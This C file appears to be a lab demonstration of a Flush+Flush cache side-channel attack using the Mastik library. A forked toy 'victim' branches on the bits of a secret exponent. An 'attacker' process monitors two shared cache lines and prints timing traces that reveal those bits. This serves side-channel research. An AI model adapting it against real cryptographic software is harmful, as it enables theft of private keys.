#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <mastik/symbol.h>
#include <mastik/ff.h>
#include <mastik/util.h>

#include "../tests/dummy.h"

#define SAMPLES 10000
#define SLOT 900
#define THRESHOLD 500

void victim(unsigned char *binData, size_t binSize)
{
    for (size_t i = 0; i < binSize; i++)
    {
        for (int j = 7; j >= 0; j--)
        {
            dummy_light1();
            if (binData[i] & (1 << j))
            {
                dummy_light2();
            }
        }
    }
}

void attacker()
{
    int fd = open("../tests/dummy.o", O_RDONLY);
    size_t size = lseek(fd, 0, SEEK_END);
    if (size == 0)
        exit(-1);
    size_t map_size = size;
    if (map_size & 0xFFF != 0) // check if size > 0xFFF
    {
        map_size |= 0xFFF;
        map_size += 1;
    }

    size_t base = (size_t) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);

    size_t offset1 = 0x1ab0;
    size_t offset2 = 0x1b1f;

    ff_t ff = ff_prepare();
    int n_monitor = 2;
    ff_monitor(ff, (void*)(base+offset1));
    ff_monitor(ff, (void*)(base+offset2));

    uint16_t *res = malloc(SAMPLES * n_monitor * sizeof(uint16_t));
    for (int i = 0; i < SAMPLES * n_monitor; i += 4096 / sizeof(uint16_t))
        res[i] = 1;
    ff_probe(ff, res);

    int l;
    do
    {
        l = ff_trace(ff, SAMPLES, res, SLOT, THRESHOLD, 500);
    } while (l < 1000);
    for (int i = 0; i < l; i++)
    {
        for (int j = 0; j < n_monitor; j++)
        {
            printf("%d ", res[i * n_monitor + j]);
        }
        printf("\n");
    }

    free(res);
    ff_release(ff);
}

char *readExpFromFile(const char *filename)
{
    FILE *file = fopen(filename, "r");
    if (file == NULL)
    {
        perror("Exponent file not found");
        exit(1);
    }

    // Determine the file size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory for the buffer
    char *buffer = (char *)malloc(fileSize + 1);
    if (buffer == NULL)
    {
        perror("Memory allocation failed");
        fclose(file);
        exit(1);
    }

    // Read the file contents into the buffer
    size_t bytesRead = fread(buffer, 1, fileSize, file);
    if (bytesRead != fileSize)
    {
        perror("Error reading file");
        free(buffer);
        fclose(file);
        exit(1);
    }

    buffer[bytesRead] = '\0'; // Null-terminate the string
    fclose(file);
    return buffer;
}

void cleanHexString(char *hexStr)
{
    char *src = hexStr, *dst = hexStr;
    while (*src)
    {
        if ((*src >= '0' && *src <= '9') || (*src >= 'a' && *src <= 'f') || (*src >= 'A' && *src <= 'F'))
        {
            *dst++ = *src;
        }
        src++;
    }
    *dst = '\0';
}

unsigned char *cvtHex2bin(const char *hexStr, size_t *binSize)
{
    size_t hexLen = strlen(hexStr);
    *binSize = hexLen / 2;
    unsigned char *binData = (unsigned char *)malloc(*binSize);
    if (binData == NULL)
    {
        perror("Memory allocation failed");
        exit(1);
    }

    for (size_t i = 0; i < *binSize; i++)
    {
        sscanf(hexStr + 2 * i, "%2hhx", &binData[i]);
    }

    return binData;
}

int main()
{
    pid_t pid, wpid;
    int status = 0;

    pid = fork();
    if (pid < 0)
    {
        perror("fork fail");
        exit(1);
    }
    else if (pid == 0)
    {
        // Child (Victim)

        // Read the file contents into the buffer
        char *buffer = readExpFromFile("./exponent.txt");
        // printf("File contents: %s\n", buffer);

        // Clean the hex string to remove colons and newlines
        cleanHexString(buffer);
        // printf("Cleaned hex string: %s\n", buffer);

        // Convert hex string to binary data
        size_t binSize;
        unsigned char *binData = cvtHex2bin(buffer, &binSize);
        // printf("Binary data size: %zu\n", binSize);

        delayloop(1000000);
        victim(binData, binSize);
        free(buffer);
        free(binData);
        exit(0);
    }
    else
    {
        // Parent (Attacker)
        attacker();
    }

    while ((wpid = wait(&status)) > 0)
        ;

    exit(0);
}